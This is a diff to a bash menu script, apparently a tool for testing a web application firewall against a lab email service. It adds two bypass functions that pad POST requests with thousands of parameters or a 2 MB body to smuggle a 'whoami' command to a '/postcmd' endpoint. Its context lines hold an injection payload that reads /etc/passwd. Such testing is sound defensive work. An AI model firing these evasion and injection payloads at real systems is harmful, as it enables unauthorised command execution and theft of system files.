@@ -257,6 +257,32 @@ preformWAFBypassExcessiveURLParams(){
       curl "$url&ip=localhost%20;%20cat%20/etc/passwd"
 }
 
+preformWAFBypassExcessivePostParams(){
+    params="param0=value0"
+
+      # Loop to add additional parameters
+      for i in {1..9300}
+      do
+        params="$params&param$i=value$i"
+      done
+
+      params="$params&arg=whoami"
+      
+      curl --location "http://$host:$emailserviceport/postcmd" \
+      --header 'Content-Type: application/x-www-form-urlencoded' \
+      --data "$params"
+}
+
+preformWAFBypassLargePostBody(){
+      value=$(yes a | head -c 2048576 | tr -d '\n')
+
+      params="param1=$value&arg=whoami"
+      
+      curl --location "http://$host:$emailserviceport/postcmd" \
+      --header 'Content-Type: application/x-www-form-urlencoded' \
+      --data "$params"
+}
+
 # Function to display the menu
 display_menu() {
   echo "---------------------"
@@ -292,6 +318,8 @@ display_menu() {
   echo "26 Perform WAF Volume Test"
   echo "27 WAF Bypass File Glob"
   echo "28 WAF Bypass Excessive URL Params"
+  echo "29 WAF Bypass Excessive Post Params"
+  echo "30 WAF Bypass Large Post Body"
   echo "---------------------"
 }
 
@@ -466,6 +494,16 @@ while true; do
       preformWAFBypassExcessiveURLParams
       read -p "Press Enter to continue..."
       ;;
+    29)
+      echo "Perform WAF Bypass Exccessive Post Params"
+      preformWAFBypassExcessivePostParams
+      read -p "Press Enter to continue..."
+    ;;
+    30)
+      echo "Perform WAF Bypass Large Post Body"
+      preformWAFBypassLargePostBody
+      read -p "Press Enter to continue..."
+    ;;
     *)
       echo "Invalid choice!"
       read -p "Press Enter to continue..."
